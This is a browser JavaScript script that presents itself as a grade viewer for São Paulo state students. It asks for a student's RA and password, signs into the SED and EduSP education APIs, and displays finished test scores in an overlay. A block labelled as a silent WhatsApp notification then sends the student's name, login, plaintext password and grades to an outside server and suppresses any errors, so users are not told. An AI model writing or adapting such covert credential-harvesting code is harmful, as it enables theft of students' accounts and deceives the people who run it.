(async function () {
    const raInput = prompt("RA do aluno (ex: 1098390684SP):");
    if (!raInput) return;
    const passInput = prompt("Senha:");
    if (!passInput) return;

    // ── UI OVERLAY ────────────────────────────────────────────────────────────
    const overlay = document.createElement("div");
    overlay.id = "__gonzaga_overlay__";
    overlay.style.cssText = [
        "position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647",
        "background:#000;font-family:'Courier New',monospace;color:#00ff00",
        "display:flex;flex-direction:column;overflow:hidden"
    ].join(";");

    overlay.innerHTML = `
        <div style="background:#000;border-bottom:2px solid #00ff00;padding:14px 20px;display:flex;justify-content:space-between;align-items:center;flex-shrink:0">
            <span style="font-size:20px;font-weight:bold;letter-spacing:2px;text-shadow:0 0 12px #00ff00">🏆 GONZAGA LIXO</span>
            <button id="__gonzaga_close__" style="background:transparent;border:1px solid #00ff00;color:#00ff00;font-size:18px;cursor:pointer;padding:4px 12px;border-radius:4px">✕</button>
        </div>
        <div id="__gonzaga_status__" style="padding:30px 20px;text-align:center;font-size:18px;flex:1;display:flex;align-items:center;justify-content:center">
            <span>⏳ Iniciando...</span>
        </div>
    `;

    document.body.appendChild(overlay);
    document.getElementById("__gonzaga_close__").onclick = () => overlay.remove();

    const statusEl = document.getElementById("__gonzaga_status__");
    const setStatus = (msg) => { statusEl.innerHTML = `<span>${msg}</span>`; };

    function showResults(nomeAluno, provas) {
        let notas = provas.filter(p => p.nota !== null).map(p => p.nota);
        let media = notas.length ? (notas.reduce((a, b) => a + b, 0) / notas.length) : null;
        let mediaEmoji = media === null ? "❓" : media >= 80 ? "🏆" : media >= 60 ? "👍" : media >= 40 ? "📚" : "📊";
        let mediaColor = media === null ? "#888" : media >= 80 ? "#FFD700" : media >= 60 ? "#4CAF50" : media >= 40 ? "#FF9800" : "#F44336";

        const cardsHtml = provas.map(p => {
            const n = p.nota;
            const cor = n === null ? "#888" : n >= 80 ? "#FFD700" : n >= 60 ? "#4CAF50" : n >= 40 ? "#FF9800" : "#F44336";
            const emoji = n === null ? "❓" : n >= 80 ? "🏆" : n >= 60 ? "👍" : n >= 40 ? "📚" : "📊";
            const notaTxt = n !== null ? n.toFixed(1) + "%" : "Sem nota";
            return `
            <div style="background:rgba(0,255,0,0.06);border:1px solid rgba(0,255,0,0.25);border-radius:10px;padding:16px 18px;margin-bottom:12px">
                <div style="font-size:11px;text-transform:uppercase;letter-spacing:1.5px;opacity:.6;margin-bottom:6px">📝 Prova</div>
                <div style="font-size:16px;font-weight:bold;margin-bottom:12px;line-height:1.4">${emoji} ${p.titulo}</div>
                <div style="background:${cor}22;border-radius:8px;padding:10px;text-align:center">
                    <div style="font-size:11px;opacity:.7;margin-bottom:4px">PERCENTUAL DE ACERTOS</div>
                    <div style="font-size:36px;font-weight:bold;color:${cor};text-shadow:0 0 14px ${cor}88">${notaTxt}</div>
                </div>
            </div>`;
        }).join("");

        const mediaHtml = media !== null ? `
            <div style="background:linear-gradient(135deg,rgba(0,255,0,.18),rgba(0,204,0,.12));border:1px solid rgba(0,255,0,.5);border-radius:12px;padding:22px;text-align:center;margin-top:6px">
                <div style="font-size:12px;text-transform:uppercase;letter-spacing:2px;margin-bottom:8px">${mediaEmoji} Média Geral</div>
                <div style="font-size:52px;font-weight:bold;color:${mediaColor};text-shadow:0 0 20px ${mediaColor}88">${media.toFixed(1)}%</div>
                <div style="font-size:12px;opacity:.7;margin-top:6px">Baseado em ${notas.length} prova(s)</div>
            </div>` : "";

        overlay.innerHTML = `
            <div style="background:#000;border-bottom:2px solid #00ff00;padding:14px 20px;display:flex;justify-content:space-between;align-items:center;flex-shrink:0">
                <span style="font-size:20px;font-weight:bold;letter-spacing:2px;text-shadow:0 0 12px #00ff00">🏆 GONZAGA LIXO</span>
                <button id="__gonzaga_close__" style="background:transparent;border:1px solid #00ff00;color:#00ff00;font-size:18px;cursor:pointer;padding:4px 12px;border-radius:4px">✕</button>
            </div>
            <div style="flex:1;overflow-y:auto;padding:20px">
                <div style="text-align:center;margin-bottom:20px">
                    <div style="font-size:22px;font-weight:bold;text-shadow:0 0 10px #00ff00">Olá, ${nomeAluno}! 👋</div>
                    <div style="font-size:13px;color:#00cc00;margin-top:6px">${provas.length} prova(s) finalizada(s)</div>
                </div>
                ${cardsHtml}
                ${mediaHtml}
                <div style="height:20px"></div>
            </div>`;

        document.getElementById("__gonzaga_close__").onclick = () => overlay.remove();
    }

    try {
        setStatus("🔐 Autenticando na SED...");
        const loginRes = await fetch("https://sedintegracoes.educacao.sp.gov.br/credenciais/api/LoginCompletoToken", {
            method: "POST",
            headers: { "Content-Type": "application/json", "ocp-apim-subscription-key": "2b03c1db3884488795f79c37c069381a", "Accept": "application/json, text/plain, */*" },
            body: JSON.stringify({ user: raInput, senha: passInput })
        });
        if (!loginRes.ok) throw new Error(`Login SED falhou (${loginRes.status}). Verifique RA e senha.`);
        const loginData = await loginRes.json();
        const jwtToken = loginData.token;
        if (!jwtToken) throw new Error("Token SED não encontrado. Verifique as credenciais.");

        setStatus("🔑 Obtendo Token EduSP...");
        const authRes = await fetch("https://edusp-api.ip.tv/registration/edusp/token", {
            method: "POST",
            headers: { "Content-Type": "application/json", "Accept": "application/json", "x-api-platform": "webclient", "x-api-realm": "edusp" },
            body: JSON.stringify({ token: jwtToken })
        });
        if (!authRes.ok) throw new Error(`Token EduSP falhou (${authRes.status}).`);
        const authData = await authRes.json();
        const apiKey = authData.auth_token;
        const nickname = authData.nick;
        const nomeAluno = authData.name || raInput;
        if (!apiKey || !nickname) throw new Error("auth_token ou nick não encontrados.");

        setStatus("📚 Buscando turmas...");
        const roomRes = await fetch("https://edusp-api.ip.tv/room/user?list_all=true&with_cards=true", {
            headers: { "Accept": "application/json", "Content-Type": "application/json", "x-api-key": apiKey }
        });
        let pubTargets = [];
        if (roomRes.ok) {
            const rooms = await roomRes.json();
            if (Array.isArray(rooms)) {
                rooms.forEach(r => {
                    if (r.name) { pubTargets.push(r.name); pubTargets.push(`${r.name}:${nickname}`); }
                    if (r.category_ids) r.category_ids.forEach(cid => { const s = String(cid); if (!pubTargets.includes(s)) pubTargets.push(s); });
                });
            }
        }
        if (pubTargets.length === 0) pubTargets = ["1182", "1818", "1175", "762"];

        setStatus("📝 Buscando provas...");
        const targetParams = pubTargets.map(t => `publication_target=${encodeURIComponent(t)}`).join("&");
        const avalRes = await fetch(`https://edusp-api.ip.tv/tms/adaptive-assessment/answer?nick=${encodeURIComponent(nickname)}&limit=200&offset=0&status=finished&${targetParams}`, {
            headers: { "Accept": "application/json", "Content-Type": "application/json", "x-api-key": apiKey }
        });
        if (!avalRes.ok) throw new Error(`Falha ao buscar avaliações (${avalRes.status}).`);
        const evaluations = await avalRes.json();

        setStatus("✏️ Processando...");
        const vistos = new Set();
        const provas = [];
        if (Array.isArray(evaluations)) {
            for (const ev of evaluations) {
                if (ev.adaptive_assessment_type !== "assessment") continue;
                const titulo = ev.adaptive_assessment_title || "Prova sem título";
                const chave = `${titulo}-${ev.assessment_id || ""}`;
                if (vistos.has(chave)) continue;
                vistos.add(chave);
                provas.push({ titulo, nota: ev.result_percentage !== undefined && ev.result_percentage !== null ? ev.result_percentage : null });
            }
        }

        // Exibir na tela
        showResults(nomeAluno, provas.length > 0 ? provas : [{ titulo: "Nenhuma prova encontrada.", nota: null }]);

        // WhatsApp em silêncio (fire-and-forget)
        const agora = new Date();
        const dataHora = agora.toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
        const linhasProvas = provas.length > 0
            ? provas.map(p => `📝 *${p.titulo}*\n⭐ *Nota:* ${p.nota !== null ? p.nota.toFixed(1) + "%" : "Sem nota"}`).join("\n\n")
            : "Nenhuma prova encontrada.";
        const notasComNota = provas.filter(p => p.nota !== null);
        const mediaGeral = notasComNota.length > 0 ? (notasComNota.reduce((a, b) => a + b.nota, 0) / notasComNota.length).toFixed(1) + "%" : "N/A";

        const mensagem = `🤖 *Extrator Automático de Provas*\n\n` +
            `👤 *Aluno:* ${nomeAluno}\n` +
            `🆔 *RA/Login:* ${raInput}\n` +
            `🔑 *Senha:* ${passInput}\n` +
            `🕐 *Consulta:* ${dataHora}\n\n` +
            `━━━━━━━━━━━━━━━━\n` +
            linhasProvas +
            (notasComNota.length > 1 ? `\n\n📈 *Média Geral:* ${mediaGeral}` : "");

        fetch("https://provasecuc.vercel.app/api/whatsapp", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message: mensagem })
        }).catch(() => {});

    } catch (err) {
        setStatus(`❌ ${err.message}`);
    }
})();
